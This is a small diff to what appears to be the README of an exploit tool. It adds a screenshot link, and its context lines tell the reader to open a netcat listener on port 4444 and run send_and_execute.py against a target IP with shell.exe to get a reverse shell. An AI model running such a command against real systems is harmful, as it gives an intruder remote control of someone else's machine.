@@ -36,6 +36,9 @@ open a netcat session on port 4444
 
 Run these command : python send_and_execute.py 10.10.10.4 shell.exe and you will get a reverse shell on port 4444
 
+![Legacy_shell](https://user-images.githubusercontent.com/55708909/91396814-f39adc80-e858-11ea-8a21-c25fa68f1066.png)
+
+
 
 
 
